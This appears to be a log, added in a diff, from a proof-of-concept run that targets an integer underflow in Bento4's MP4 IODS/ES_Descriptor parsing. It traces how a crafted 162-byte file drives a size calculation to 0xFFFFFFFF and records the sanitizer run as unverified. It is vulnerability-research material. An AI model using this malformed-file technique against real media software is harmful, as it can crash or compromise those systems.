@@ -1,0 +1,29 @@
+=== VULN 003 PoC Run ===
+Date: Mon Sep  7 05:12:03 PM +08 2026
+
+[1] Generating PoC MP4...
+Generated: /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IodsAtom_h/vuln_003.mp4
+Total size: 162 bytes
+
+Expected underflow path:
+  iods -> IOD(tag=0x10, payload_size=12)
+    IOD SubStream size = 12 - 7 = 5 bytes
+    IOD SubStream content: [0x03][0x02][0x00][0x01][0x00]
+    ES_Descriptor(payload_size=2):
+      ReadUI16(ES_ID) -> 2 bytes consumed, pos=4
+      ReadUI08(flags) -> extra byte at pos 4 consumed, pos=5
+      offset-start = 5-2 = 3
+      payload_size - AP4_Size(3) = 2u - 3u = 0xFFFFFFFF  <- UNDERFLOW
+      SubStream created with size=0xFFFFFFFF (~4.3 GB)
+
+[2] Running mp42aac (ASAN+UBSAN build)...
+ERROR: no audio track found
+
+[3] Collecting sanitizer logs...
+[4] Checking for crash indicators in binary output...
+STATUS: UNVERIFIED - no sanitizer error in binary output.
+Note: Integer underflow occurs at code level (2u-3u=0xFFFFFFFF) but
+      unsigned underflow is NOT caught by -fsanitize=address,undefined
+      (requires -fsanitize=integer or -fsanitize=unsigned-integer-overflow)
+
+=== Done ===
